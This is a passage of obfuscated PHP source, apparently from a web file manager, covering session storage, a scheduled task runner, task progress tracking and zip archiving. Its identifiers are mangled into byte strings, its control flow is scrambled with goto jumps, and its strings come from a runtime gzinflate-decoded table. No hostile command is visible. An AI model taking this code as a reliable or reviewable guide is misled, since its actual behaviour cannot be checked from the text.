Bèñ›ºñ…; fïÂ§£À¹İ: } public static function sign($cëäòÉ»à = false) { $cëäòÉ»à && (self::$sessionSign = $cëäòÉ»à); self::init(); return self::$sessionSign; } public static function set($E‹å¯²ˆæ, $dØ•—ĞÀ¿ = false) { self::init(); if (is_array($E‹å¯²ˆæ)) { foreach ($E‹å¯²ˆæ as $A»¤Ãƒ¼ã¤ => $F…³†ƒˆÜŸ) { array_set_value(self::$data, $A»¤Ãƒ¼ã¤, $F…³†ƒˆÜŸ); } } else { array_set_value(self::$data, $E‹å¯²ˆæ, $dØ•—ĞÀ¿); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($e˜‰Ë¨¡µë = false) { self::init(); if (!$e˜‰Ë¨¡µë) { return self::$data; } return array_get_value(self::$data, $e˜‰Ë¨¡µë); } public static function remove($BõÛ¶‹ô) { self::init(); unset(self::$data[$BõÛ¶‹ô]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ã®Â„Éæ¹¤][783])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto Cè£İŒó‰Ù; fÜÉğÜ³Î : while (!0) { self::cacheClear(); if (self::valueGet($BÁ”¦Ú®Ô[711]) != $BÁ”¦Ú®Ô[83]) { self::valueSet($BÁ”¦Ú®Ô[1420], $BÁ”¦Ú®Ô[470]); self::log($BÁ”¦Ú®Ô[1424]); die; } self::valueSet($BÁ”¦Ú®Ô[1420], $BÁ”¦Ú®Ô[83]); self::valueSet($BÁ”¦Ú®Ô[1421], time()); self::taskRunAll(); sleep(self::valueGet($BÁ”¦Ú®Ô[1425])); } goto EÕß…Ş×‹á; b¢‘èœ—ë: http_close(); self::valueSet($BÁ”¦Ú®Ô[1420], $BÁ”¦Ú®Ô[83]); Hook::bind($BÁ”¦Ú®Ô[1422], $BÁ”¦Ú®Ô[1423]); goto fÜÉğÜ³Î ; Cè£İŒó‰Ù: $BÁ”¦Ú®Ô =& $_SERVER[ã®Â„Éæ¹¤]; if (self::valueGet($BÁ”¦Ú®Ô[711]) != $BÁ”¦Ú®Ô[83]) { return; } if (self::valueGet($BÁ”¦Ú®Ô[1420]) == $BÁ”¦Ú®Ô[83]) { $cìµî½¥»– = self::valueGet($BÁ”¦Ú®Ô[1421]); if (time() - $cìµî½¥»– > 3600 * 2) { self::restart(); } return; } goto b¢‘èœ—ë; EÕß…Ş×‹á: } public static function restart() { $dŠİ¶ŸàÏ‡ =& $_SERVER[ã®Â„Éæ¹¤]; http_close(); self::valueSet($dŠİ¶ŸàÏ‡[711], $dŠİ¶ŸàÏ‡[470]); sleep(self::valueGet($dŠİ¶ŸàÏ‡[1425]) + 5); self::valueSet($dŠİ¶ŸàÏ‡[1420], $dŠİ¶ŸàÏ‡[470]); self::valueSet($dŠİ¶ŸàÏ‡[711], $dŠİ¶ŸàÏ‡[83]); } public static function shutdownEvent() { $FËöÜŠĞµ¦ =& $_SERVER[ã®Â„Éæ¹¤]; self::valueSet($FËöÜŠĞµ¦[1420], $FËöÜŠĞµ¦[470]); self::log($FËöÜŠĞµ¦[1426]); } public static function config($CàçÄ«Œ, $EÀ•ÖØòÛ¸) { $a˜Ó“ì¿ƒé =& $_SERVER[ã®Â„Éæ¹¤]; $f¯‹„¹¹‡Œ = 20; $EÀ•ÖØòÛ¸ = intval($EÀ•ÖØòÛ¸) <= $f¯‹„¹¹‡Œ ? $f¯‹„¹¹‡Œ : intval($EÀ•ÖØòÛ¸); self::valueSet($a˜Ó“ì¿ƒé[711], $CàçÄ«Œ); self::valueSet($a˜Ó“ì¿ƒé[1425], $EÀ•ÖØòÛ¸); } private static function taskRunAll() { $E¢…ŒóÛ… =& $_SERVER[ã®Â„Éæ¹¤]; $e¼Şëº¸É = Model($E¢…ŒóÛ…[1427])->listData(); $fÅêÎ†Ş = count($e¼Şëº¸É); for ($EŒ·‹åÁ‡» = 0; $EŒ·‹åÁ‡» < $fÅêÎ†Ş; $EŒ·‹åÁ‡»++) { $CŒá¤ÎÎ‘¢ = $e¼Şëº¸É[$EŒ·‹åÁ‡»]; if ($CŒá¤ÎÎ‘¢[$E¢…ŒóÛ…[1428]] != $E¢…ŒóÛ…[83]) { continue; } if (!self::taskTimeCheck($CŒá¤ÎÎ‘¢)) { continue; } self::taskRun($CŒá¤ÎÎ‘¢); } Hook::trigger($E¢…ŒóÛ…[1429]); } private static function taskTimeCheck($EãåÎ›ëÍ) { goto fˆÌóô¤Ãé; FÉ‚Ä´‹î‰: switch ($eÀ¢­Ú ÔÌ[$D÷¨©ê«à[29]]) { case $D÷¨©ê«à[1436]: if (time() - $BãáÕè¬Üˆ < 3600 * 24 * 30) { return !1; } if ($eÀ¢­Ú ÔÌ[$D÷¨©ê«à[1436]] == date($D÷¨©ê«à[1437]) && $Bà‰®ÏÉ”) { return !0; } break; case $D÷¨©ê«à[1438]: if (time() - $BãáÕè¬Üˆ < 3600 * 24 * 7) { return !1; } $BËö¥Ş†ëï = date($D÷¨©ê«à[1439]) == 0 ? 7 : date($D÷¨©ê«à[1439]); if ($eÀ¢­Ú ÔÌ[$D÷¨©ê«à[1438]] == $BËö¥Ş†ëï && $Bà‰®ÏÉ”) { return !0; } break; case $D÷¨©ê«à[1431]: if (time() - $BãáÕè¬Üˆ < 3600 * 24) { return !1; } if ($Bà‰®ÏÉ”) { return !0; } break; case $D÷¨©ê«à[1440]: if (time() - $BãáÕè¬Üˆ >= floatval($eÀ¢­Ú ÔÌ[$D÷¨©ê«à[1440]]) * 60) { return !0; } break; default: break; } return !1; goto d˜µš¹¡ù; cÅß‹„è: $aË©¾æ¡è¶ = strtotime($D÷¨©ê«à[1430] . $eÀ¢­Ú ÔÌ[$D÷¨©ê«à[1431]] . $D÷¨©ê«à[1432]) - strtotime($D÷¨©ê«à[1433]); $aÊå„‚òô = time() - strtotime(date($D÷¨©ê«à[1434]) . $D÷¨©ê«à[1435]); $Bà‰®ÏÉ” = $aÊå„‚òô >= $aË©¾æ¡è¶ && $aÊå„‚òô <= $aË©¾æ¡è¶ + 3600; goto FÉ‚Ä´‹î‰; fˆÌóô¤Ãé: $D÷¨©ê«à =& $_SERVER[ã®Â„Éæ¹¤]; $eÀ¢­Ú ÔÌ = json_decode($EãåÎ›ëÍ[$D÷¨©ê«à[190]], !0); $BãáÕè¬Üˆ = intval($EãåÎ›ëÍ[$D÷¨©ê«à[1421]]); goto cÅß‹„è; d˜µš¹¡ù: } public static function taskRun($D¢©ñ¿×•) { goto E»ìÏŠ±ª¯; Eİº‘ëÁ…Æ: Model($FÏ»ˆä…âÂ[1445])->add(array($FÏ»ˆä…âÂ[1446] => $FÏ»ˆä…âÂ[33], $FÏ»ˆä…âÂ[1447] => $FÏ»ˆä…âÂ[470], $FÏ»ˆä…âÂ[29] => $FÏ»ˆä…âÂ[1448] . $D¢©ñ¿×•[$FÏ»ˆä…âÂ[367]], $FÏ»ˆä…âÂ[1449] => json_encode(array($FÏ»ˆä…âÂ[28] => $D¢©ñ¿×•[$FÏ»ˆä…âÂ[28]], $FÏ»ˆä…âÂ[1450] => timeFloat() - $e°å‰Šã¼Ø, $FÏ»ˆä…âÂ[281] => $cÔÕ±ô÷¡)))); self::log($FÏ»ˆä…âÂ[1451] . $D¢©ñ¿×•[$FÏ»ˆä…âÂ[367]] . $FÏ»ˆä…âÂ[1452] . $cÔÕ±ô÷¡); return !0; goto f£ï†»ÃÇõ; E‰ñåéÂªÍ: $e°å‰Šã¼Ø = timeFloat(); $cÔÕ±ô÷¡ = $FÏ»ˆä…âÂ[33]; switch ($D¢©ñ¿×•[$FÏ»ˆä…âÂ[29]]) { case $FÏ»ˆä…âÂ[295]: $E¦£šø’­ = url_request($D¢©ñ¿×•[$FÏ»ˆä…âÂ[1444]], $FÏ»ˆä…âÂ[216], !1, !1, !1, !1, 5); $cÔÕ±ô÷¡ = strlen($E¦£šø’­); break; case $FÏ»ˆä…âÂ[215]: $cÔÕ±ô÷¡ = Hook::apply($D¢©ñ¿×•[$FÏ»ˆä…âÂ[1444]]); default: break; } goto Eİº‘ëÁ…Æ; E»ìÏŠ±ª¯: $FÏ»ˆä…âÂ =& $_SERVER[ã®Â„Éæ¹¤]; self::log($FÏ»ˆä…âÂ[1441] . $D¢©ñ¿×•[$FÏ»ˆä…âÂ[367]] . $FÏ»ˆä…âÂ[1442] . $D¢©ñ¿×•[$FÏ»ˆä…âÂ[28]] . $FÏ»ˆä…âÂ[1443] . $D¢©ñ¿×•[$FÏ»ˆä…âÂ[1444]]); Model($FÏ»ˆä…âÂ[1427])->run($D¢©ñ¿×•[$FÏ»ˆä…âÂ[367]]); goto E‰ñåéÂªÍ; f£ï†»ÃÇõ: } private static function valueGet($fÚ—ÄËç) { $E£ÍÜ‘Òêš =& $_SERVER[ã®Â„Éæ¹¤]; $A‹«‰²‚ˆß = $E£ÍÜ‘Òêš[1453]; $d´§áãÚé = Model($E£ÍÜ‘Òêš[1454])->get($fÚ—ÄËç, $A‹«‰²‚ˆß); if (is_null($d´§áãÚé)) { Model($E£ÍÜ‘Òêš[1454])->set($E£ÍÜ‘Òêš[1425], 10, $A‹«‰²‚ˆß); Model($E£ÍÜ‘Òêš[1454])->set($E£ÍÜ‘Òêš[711], $E£ÍÜ‘Òêš[83], $A‹«‰²‚ˆß); Model($E£ÍÜ‘Òêš[1454])->set($E£ÍÜ‘Òêš[1420], $E£ÍÜ‘Òêš[470], $A‹«‰²‚ˆß); $d´§áãÚé = Model($E£ÍÜ‘Òêš[1454])->get($fÚ—ÄËç, $A‹«‰²‚ˆß); } return $d´§áãÚé; } private static function valueSet($Eö“ëÂÙª, $d‰ñ¬²§ŒÖ) { $aïˆĞìß =& $_SERVER[ã®Â„Éæ¹¤]; return Model($aïˆĞìß[1454])->set($Eö“ëÂÙª, $d‰ñ¬²§ŒÖ, $aïˆĞìß[1453]); } protected static function log($fè–Ó±ƒ•à) { write_log($fè–Ó±ƒ•à, $_SERVER[ã®Â„Éæ¹¤][1455]); } private static function cacheClear() { $d¸Ÿâ³ÜÌÖ =& $_SERVER[ã®Â„Éæ¹¤]; $E¾¸³à…¸ = Model($d¸Ÿâ³ÜÌÖ[1454])->cacheKey($d¸Ÿâ³ÜÌÖ[1453]); Cache::clearMemory($E¾¸³à…¸); Model($d¸Ÿâ³ÜÌÖ[1427])->cacheClear(); } } class Task { const STATYS_STOP = "\x73\164\x6f\160"; const STATYS_RUNNING = "\162\165\x6e\156\151\156\147"; const STATYS_KILL = "\x6b\x69\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($CË·İì×õ¼, $dÛÚ½à¾”´ = '', $eÏ×Æ«…İ = 0, $dá¶Ú¿ÈÄÌ = '') { goto AÄ÷½Ÿ¨ì; E‹…œ”­ÁÈ: Hook::trigger($aéÔçÄ¨…À[1467], $this->task); $this->task[$aéÔçÄ¨…À[1461]] = timeFloat(); goto eËÈ›Ü‹Ë; D°¾¿ğ÷™¶: Hook::bind($aéÔçÄ¨…À[1422], array($this, $aéÔçÄ¨…À[1464])); Hook::bind($aéÔçÄ¨…À[1465], array($this, $aéÔçÄ¨…À[1466])); $this->startAfter(); goto E‹…œ”­ÁÈ; AÄ÷½Ÿ¨ì: $aéÔçÄ¨…À =& $_SERVER[ã®Â„Éæ¹¤]; if (self::get($CË·İì×õ¼)) { return; } $this->task = array($aéÔçÄ¨…À[367] => $CË·İì×õ¼, $aéÔçÄ¨…À[1456] => USER_ID, $aéÔçÄ¨…À[1362] => $dá¶Ú¿ÈÄÌ, $aéÔçÄ¨…À[29] => $dÛÚ½à¾”´, $aéÔçÄ¨…À[997] => $aéÔçÄ¨…À[33], $aéÔçÄ¨…À[995] => $eÏ×Æ«…İ, $aéÔçÄ¨…À[1009] => 0, $aéÔçÄ¨…À[1457] => 0, $aéÔçÄ¨…À[1458] => 0, $aéÔçÄ¨…À[1459] => timeFloat(), $aéÔçÄ¨…À[1460] => 0, $aéÔçÄ¨…À[1461] => 0, $aéÔçÄ¨…À[1462] => 0, $aéÔçÄ¨…À[1463] => 0, $aéÔçÄ¨…À[711] => $aéÔçÄ¨…À[1420]); goto D°¾¿ğ÷™¶; eËÈ›Ü‹Ë: } public function end() { goto bÈ¢“¶Äæà; D‹°‡ºÌªµ: $eï–‚™œ = timeFloat() - $this->task[$DÚİŒÃ‰Öâ[1459]]; self::log($DÚİŒÃ‰Öâ[1468] . $this->task[$DÚİŒÃ‰Öâ[367]] . $DÚİŒÃ‰Öâ[1469] . $eï–‚™œ . $DÚİŒÃ‰Öâ[1470]); Hook::unbind($DÚİŒÃ‰Öâ[1422], array($this, $DÚİŒÃ‰Öâ[1464])); goto Fé¸¬ÖÕ©; Fé¸¬ÖÕ©: Hook::unbind($DÚİŒÃ‰Öâ[1465], array($this, $DÚİŒÃ‰Öâ[1466])); $this->endAfter(); $this->task = !1; goto F£õ²—ğ; bÈ¢“¶Äæà: $DÚİŒÃ‰Öâ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$this->task) { return; } if ($this->task[$DÚİŒÃ‰Öâ[1461]]) { self::valueSet($this->task[$DÚİŒÃ‰Öâ[367]], !1); } goto D‹°‡ºÌªµ; F£õ²—ğ: } public function update($aîùÄÍ÷Ô = 0) { goto eĞ›ŠË‰ğƒ; c¯è´–˜: Hook::trigger($Aå‹¬¾’ç[1474], $cºÚÁ…„¦ù); self::valueSet($cºÚÁ…„¦ù[$Aå‹¬¾’ç[367]], $cºÚÁ…„¦ù); goto D£ìå¯Ğô; fĞğç öŸ: $this->updateAfter(); $aµáê»Ô´Ë = 0.2; if (timeFloat() - $cºÚÁ…„¦ù[$Aå‹¬¾’ç[1461]] < $aµáê»Ô´Ë) { return; } goto bÓ²ÚâçÜİ; c©ÛêÓ‚: $cºÚÁ…„¦ù[$Aå‹¬¾’ç[711]] = $A™¦»±Ü‡Š ? $A™¦»±Ü‡Š : $cºÚÁ…„¦ù[$Aå‹¬¾’ç[711]]; $cºÚÁ…„¦ù[$Aå‹¬¾’ç[1462]] = $eœ´º«¶ù[$Aå‹¬¾’ç[1462]] ? $eœ´º«¶ù[$Aå‹¬¾’ç[1462]] : 0; $cºÚÁ…„¦ù[$Aå‹¬¾’ç[1461]] = timeFloat(); goto c¯è´–˜; bÓ²ÚâçÜİ: $eœ´º«¶ù = self::get($cºÚÁ…„¦ù[$Aå‹¬¾’ç[367]]); $A™¦»±Ü‡Š = $eœ´º«¶ù[$Aå‹¬¾’ç[711]]; if ($A™¦»±Ü‡Š == self::STATYS_KILL) { $d»ÒôøğŸ = array($Aå‹¬¾’ç[1471] => LNG($Aå‹¬¾’ç[1472]), $Aå‹¬¾’ç[1051] => !1); Cache::set($Aå‹¬¾’ç[1473] . $this->task[$Aå‹¬¾’ç[367]], $d»ÒôøğŸ, 30); $this->end(); die; } else { if ($A™¦»±Ü‡Š == self::STATYS_STOP) { $c—Şà˜Æƒ¾ = 2; $eœ´º«¶ù[$Aå‹¬¾’ç[1462]] += $c—Şà˜Æƒ¾; self::valueSet($cºÚÁ…„¦ù[$Aå‹¬¾’ç[367]], $eœ´º«¶ù); sleep($c—Şà˜Æƒ¾); $this->update(); return; } } goto c©ÛêÓ‚; E¨¿òÉ‚ˆ: $cºÚÁ…„¦ù[$Aå‹¬¾’ç[1009]] += $aîùÄÍ÷Ô; $cºÚÁ…„¦ù[$Aå‹¬¾’ç[1460]] = timeFloat(); if ($cºÚÁ…„¦ù[$Aå‹¬¾’ç[995]]) { if ($cºÚÁ…„¦ù[$Aå‹¬¾’ç[995]] < $cºÚÁ…„¦ù[$Aå‹¬¾’ç[1009]]) { $cºÚÁ…„¦ù[$Aå‹¬¾’ç[995]] = $cºÚÁ…„¦ù[$Aå‹¬¾’ç[1009]]; } $aØê‡¸ ¹‹ = timeFloat() - $cºÚÁ…„¦ù[$Aå‹¬¾’ç[1459]] - $cºÚÁ…„¦ù[$Aå‹¬¾’ç[1462]]; $cºÚÁ…„¦ù[$Aå‹¬¾’ç[1457]] = $cºÚÁ…„¦ù[$Aå‹¬¾’ç[1009]] / $cºÚÁ…„¦ù[$Aå‹¬¾’ç[995]]; $cºÚÁ…„¦ù[$Aå‹¬¾’ç[1458]] = $cºÚÁ…„¦ù[$Aå‹¬¾’ç[1009]] / $aØê‡¸ ¹‹; if ($cºÚÁ…„¦ù[$Aå‹¬¾’ç[1457]] > 0) { $cºÚÁ…„¦ù[$Aå‹¬¾’ç[1463]] = $aØê‡¸ ¹‹ * (1 - $cºÚÁ…„¦ù[$Aå‹¬¾’ç[1457]]) / $cºÚÁ…„¦ù[$Aå‹¬¾’ç[1457]]; } $cºÚÁ…„¦ù[$Aå‹¬¾’ç[1463]] = $cºÚÁ…„¦ù[$Aå‹¬¾’ç[1463]] <= 0 ? 0 : $cºÚÁ…„¦ù[$Aå‹¬¾’ç[1463]]; } goto fĞğç öŸ; eĞ›ŠË‰ğƒ: $Aå‹¬¾’ç =& $_SERVER[ã®Â„Éæ¹¤]; $cºÚÁ…„¦ù =& $this->task; if (!$cºÚÁ…„¦ù) { return; } goto E¨¿òÉ‚ˆ; D£ìå¯Ğô: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($bÔ½‡‚‰à) { $e®”¤âòÛ› =& $_SERVER[ã®Â„Éæ¹¤]; Cache::set($e®”¤âòÛ›[1473] . $this->task[$e®”¤âòÛ›[367]], $bÔ½‡‚‰à, 60); return $bÔ½‡‚‰à; } public static function get($DÑ¾İ‰ó©) { return self::valueGet($DÑ¾İ‰ó©); } public static function listData() { $f¹Ï›ÄÒÀ„ = self::valueGet(); return array_sort_by($f¹Ï›ÄÒÀ„, $_SERVER[ã®Â„Éæ¹¤][1459], !0); } public static function kill($AôàºõÃ¶) { return self::changeStatus($AôàºõÃ¶, self::STATYS_KILL); } public static function stop($a³Ü¢Ûª³´) { return self::changeStatus($a³Ü¢Ûª³´, self::STATYS_STOP); } public static function restart($b™«á­®Üƒ) { return self::changeStatus($b™«á­®Üƒ, self::STATYS_RUNNING); } public static function killAll() { $eÉì¼µÑâ« =& $_SERVER[ã®Â„Éæ¹¤]; $CÓ‘„Ô°ÚÊ = self::listData(); foreach ($CÓ‘„Ô°ÚÊ as $dÒ¸äŒ•öø) { self::kill($dÒ¸äŒ•öø[$eÉì¼µÑâ«[367]]); } sleep(2); foreach ($CÓ‘„Ô°ÚÊ as $dÒ¸äŒ•öø) { self::valueSet($dÒ¸äŒ•öø[$eÉì¼µÑâ«[367]], !1); } } private static function changeStatus($c‚¶©õÎ…Ë, $bšé¿…¾°Ë) { goto DÙïµÍÈ­; DÙïµÍÈ­: $aäùŠÕˆ¬ =& $_SERVER[ã®Â„Éæ¹¤]; $D„×˜ÓÛ‘¶ = self::valueGet($c‚¶©õÎ…Ë); if (!$D„×˜ÓÛ‘¶) { return !1; } goto BáÅ‡ì—ª˜; EÏ­²ÂâËù: return !0; goto fáÕéœƒßİ; BáÅ‡ì—ª˜: $D„×˜ÓÛ‘¶[$aäùŠÕˆ¬[711]] = $bšé¿…¾°Ë; self::valueSet($c‚¶©õÎ…Ë, $D„×˜ÓÛ‘¶); self::log($aäùŠÕˆ¬[1475] . $D„×˜ÓÛ‘¶[$aäùŠÕˆ¬[367]] . $aäùŠÕˆ¬[1476] . $bšé¿…¾°Ë); goto EÏ­²ÂâËù; fáÕéœƒßİ: } public static function valueGet($dÒ„ÒõÄ°‹ = false) { $C ËôÊí•‚ =& $_SERVER[ã®Â„Éæ¹¤]; if ($dÒ„ÒõÄ°‹) { $EñÊ…¶Ã–  = Model($C ËôÊí•‚[399])->where(array($C ËôÊí•‚[89] => $dÒ„ÒõÄ°‹, $C ËôÊí•‚[29] => $C ËôÊí•‚[1477]))->find(); return $EñÊ…¶Ã–  ? json_decode($EñÊ…¶Ã– [$C ËôÊí•‚[359]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($aØÔïğ­Ÿš = false) { goto C‹ù˜Œªô“; C‹ù˜Œªô“: $dìôô†µèó =& $_SERVER[ã®Â„Éæ¹¤]; $d§©äé±Ÿ = array($dìôô†µèó[29] => $dìôô†µèó[1477]); if ($aØÔïğ­Ÿš) { $d§©äé±Ÿ[$dìôô†µèó[1456]] = $aØÔïğ­Ÿš; } goto cëù®»’Øª; cëù®»’Øª: $aË•ˆ±…ƒ• = Model($dìôô†µèó[399])->where($d§©äé±Ÿ)->select(); $aË•ˆ±…ƒ• = $aË•ˆ±…ƒ• ? $aË•ˆ±…ƒ• : array(); foreach ($aË•ˆ±…ƒ• as $E³‡ä¹–ğ => $b‰×‰‘¼’‰) { $aË•ˆ±…ƒ•[$E³‡ä¹–ğ] = json_decode($b‰×‰‘¼’‰[$dìôô†µèó[359]], !0); } goto Cˆ…ÚÏÉ‡’; Cˆ…ÚÏÉ‡’: return $aË•ˆ±…ƒ•; goto AÍ‡¦Ùã; AÍ‡¦Ùã: } public static function valueSet($eç˜¿í¢à¹, $e¹ó§Æ¼ö) { goto dŒ¨Äçô´Í; EÒÌÇ‹À··: Model($dÅğ—Ÿô¦¬[399])->add($Bµ³½àñ×ß, array(), !0); goto c›ŸŞ•ù°; eÍëÓÊò„Ç: if (!$dš÷²ÍäŞ) { ob_start(); var_dump($e¹ó§Æ¼ö); $CÇøö‹¨Öó = ob_get_clean(); self::log($dÅğ—Ÿô¦¬[1478] . json_encode_force($CÇøö‹¨Öó)); } if (!$eç˜¿í¢à¹ || !$e¹ó§Æ¼ö[$dÅğ—Ÿô¦¬[367]]) { return !1; } $Bµ³½àñ×ß = array($dÅğ—Ÿô¦¬[29] => $dÅğ—Ÿô¦¬[1477], $dÅğ—Ÿô¦¬[1456] => USER_ID, $dÅğ—Ÿô¦¬[89] => $eç˜¿í¢à¹, $dÅğ—Ÿô¦¬[359] => $dš÷²ÍäŞ); goto EÒÌÇ‹À··; dŒ¨Äçô´Í: $dÅğ—Ÿô¦¬ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$e¹ó§Æ¼ö) { return Model($dÅğ—Ÿô¦¬[399])->where(array($dÅğ—Ÿô¦¬[89] => $eç˜¿í¢à¹, $dÅğ—Ÿô¦¬[29] => $dÅğ—Ÿô¦¬[1477]))->delete(); } $dš÷²ÍäŞ = json_encode($e¹ó§Æ¼ö); goto eÍëÓÊò„Ç; c›ŸŞ•ù°: } public static function log($Eõ‡‘½†é) { write_log($Eõ‡‘½†é, $_SERVER[ã®Â„Éæ¹¤][1479]); } } goto f±çÀÆÛ½Ì; dŒÃ•÷¥—Õ: $Eöø˜—åê¾ = $_SERVER[ã®Â„Éæ¹¤][548]; if (!$Eöø˜—åê¾) { die; } $_SERVER[«óæÀ—¬ÛÚÈÑ] = explode($_SERVER[ã®Â„Éæ¹¤][549], gzinflate(substr($_SERVER[ã®Â„Éæ¹¤][550], 10, -8))); goto e—ßÉˆ±×Ç; eô÷­¹Ã¯İ: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $CÄº‰øÛ–Ğ; if (!$CÄº‰øÛ–Ğ) { $d„‰œå‹Ä“ = IO::init($_SERVER[ã®Â„Éæ¹¤][8]); } return $d„‰œå‹Ä“; } private static function iconvSystem($BÅ¹‰¯ÎÍ) { return self::local()->iconvSystem($BÅ¹‰¯ÎÍ); } private static function iconvApp($DÜ‡Û‹­Œ) { return self::local()->iconvApp($DÜ‡Û‹­Œ); } public static function zip($c²à™¦†êÂ, $FŸŒ“ñìÊ± = "\172\x69\160", $DƒšÎåë¾ß = '', $eğáÎí˜¬Ñ = REPEAT_RENAME) { goto C±Úƒ‚Ñù“; C±Úƒ‚Ñù“: $cÁˆğÑŞ‚ =& $_SERVER[ã®Â„Éæ¹¤]; $eˆà²†î´ = self::init($c²à™¦†êÂ[0][$cÁˆğÑŞ‚[75]]); $f¯–®®ğ„Š = self::info($c²à™¦†êÂ[0][$cÁˆğÑŞ‚[75]]); goto Eôó©ª ­Ù; Eôó©ª ­Ù: $e„¥‰×Õ§Ê = !1; if (!$DƒšÎåë¾ß && $eˆà²†î´->getType() == $cÁˆğÑŞ‚[102]) { $FÃñœ¬¼Ë = self::zipFileList($c²à™¦†êÂ); } else { $e„¥‰×Õ§Ê = $DƒšÎåë¾ß ? $DƒšÎåë¾ß : TEMP_FILES . $cÁˆğÑŞ‚[1044] . time() . rand_string(8) . $cÁˆğÑŞ‚[8]; mk_dir($e„¥‰×Õ§Ê); $FÃñœ¬¼Ë = self::zipFileList($c²à™¦†êÂ, $e„¥‰×Õ§Ê); } $cÔÈÛÁš = $f¯–®®ğ„Š[$cÁˆğÑŞ‚[28]]; goto a³ğÈ²ä‚«; Dô¸Ÿ‹ø²×: $fµŠ´ÏÁ´ë = $BøªŠ¥¢¤… . $cÔÈÛÁš . $cÁˆğÑŞ‚[91] . $FŸŒ“ñìÊ±; $fµŠ´ÏÁ´ë = get_filename_auto($fµŠ´ÏÁ´ë, $cÁˆğÑŞ‚[33], $eğáÎí˜¬Ñ); $BÂœù–½¹ = self::iconvSystem($fµŠ´ÏÁ´ë); goto FÉô¼ÈÚƒÂ; e¡ôªïÍ—ò: if ($DƒšÎåë¾ß || !$e„¥‰×Õ§Ê) { if ($e„¥‰×Õ§Ê && strstr($e„¥‰×Õ§Ê, TEMP_FILES)) { $B¤ß¬Ä–ßæ = $FÃñœ¬¼Ë = array(); recursion_dir($BøªŠ¥¢¤…, $B¤ß¬Ä–ßæ, $FÃñœ¬¼Ë, 0); foreach ($B¤ß¬Ä–ßæ as $c²“ƒëÚ²İ) { del_dir($c²“ƒëÚ²İ); } foreach ($FÃñœ¬¼Ë as $dÛï¶çæ‰ô) { if ($dÛï¶çæ‰ô == $BÂœù–½¹) { continue; } del_file($dÛï¶çæ‰ô); } } return $fµŠ´ÏÁ´ë; } $BÒ¡±¥İé = self::pathFather($f¯–®®ğ„Š[$cÁˆğÑŞ‚[75]]); $CŠÔê¶İ§ = self::move($fµŠ´ÏÁ´ë, $BÒ¡±¥İé, $eğáÎí˜¬Ñ); goto DÒŸìïªáƒ; FÉô¼ÈÚƒÂ: foreach ($FÃñœ¬¼Ë as $AóÊ…æåÎ× => $dğÂÌŒåá) { $FÃñœ¬¼Ë[$AóÊ…æåÎ×] = self::iconvSystem($dğÂÌŒåá); } KodArchive::create($BÂœù–½¹, $FÃñœ¬¼Ë); if (!IO::exist($fµŠ´ÏÁ´ë)) { if ($e„¥‰×Õ§Ê) { del_dir($e„¥‰×Õ§Ê); } show_json(LNG($cÁˆğÑŞ‚[1046]), !1); } goto e¡ôªïÍ—ò; a³ğÈ²ä‚«: if (count($FÃñœ¬¼Ë) > 1) { $EìÕÅ¼õÆÔ = IO::info(IO::pathFather($f¯–®®ğ„Š[$cÁˆğÑŞ‚[75]])); $cÔÈÛÁš = $EìÕÅ¼õÆÔ[$cÁˆğÑŞ‚[28]]; } $BøªŠ¥¢¤… = $e„¥‰×Õ§Ê; if (!$BøªŠ¥¢¤…) { $BøªŠ¥¢¤… = get_path_father($f¯–®®ğ„Š[$cÁˆğÑŞ‚[75]]); if (!$DƒšÎåë¾ß && $eˆà²†î´->getType() == $cÁˆğÑŞ‚[102]) { $BøªŠ¥¢¤… = get_path_father($eˆà²†î´->path); } $b¹æÊ›¸‹ = IO::info($BøªŠ¥¢¤…); if (!$b¹æÊ›¸‹[$cÁˆğÑŞ‚[189]]) { show_json(LNG($cÁˆğÑŞ‚[1045]), !1); } } goto Dô¸Ÿ‹ø²×; DÒŸìïªáƒ: if (!$CŠÔê¶İ§) { del_dir($e„¥‰×Õ§Ê); show_json(LNG($cÁˆğÑŞ‚[1046]), !1); } del_dir($e„¥‰×Õ§Ê); return $CŠÔê¶İ§; goto C¯Ô‚ĞÉ˜Ş; C¯Ô‚ĞÉ˜Ş: } public static function unzip($DÇŠËëŠŠ, $a÷Õ¦í˜Äô = "\x72\145\160\154\141\143\145") { goto DÙ‡Ê¯Å¶Ô; D’¿ŞìÉí½: $c‡Îª˜á = self::tmpFileName($a¯‰ é¿„×); $a¦××‰Øœ = TEMP_FILES . $c‡Îª˜á; del_dir($a¦××‰Øœ); goto eá—çÁ˜›; d ®“Ş´‚›: if (!@file_exists(self::iconvSystem($dİÒâáŒ’ñ))) { $CÓö§¶Îà¡ = self::localFilePath($f…÷ÀøØ¯„, $b«’ò•ã¬); $dİÒâáŒ’ñ = $CÓö§¶Îà¡ ? $CÓö§¶Îà¡ : parent::download($f…÷ÀøØ¯„, $dİÒâáŒ’ñ); } $dİÒâáŒ’ñ = self::iconvSystem($dİÒâáŒ’ñ); $d¯×â§øŠ = isset($DÇŠËëŠŠ[$BèÒò˜íã›[1049]]) ? $DÇŠËëŠŠ[$BèÒò˜íã›[1049]] : $BèÒò˜íã›[1050]; goto bÏ²Ä¹óÏ; DÙ‡Ê¯Å¶Ô: $BèÒò˜íã› =& $_SERVER[ã®Â„Éæ¹¤]; $f…÷ÀøØ¯„ = $DÇŠËëŠŠ[$BèÒò˜íã›[75]]; $a‹Ï¢ÁÔÑ = $DÇŠËëŠŠ[$BèÒò˜íã›[1047]]; goto b¯ô”ŸØ¢’; A‡¢Æê³ì: return !0; goto Dš³ªğÄ•; eá—çÁ˜›: mk_dir($a¦××‰Øœ); $b«’ò•ã¬ = self::fileExt($a¯‰ é¿„×); $dİÒâáŒ’ñ = $a¦××‰Øœ . $BèÒò˜íã›[91] . $b«’ò•ã¬; goto d ®“Ş´‚›; b¯ô”ŸØ¢’: if 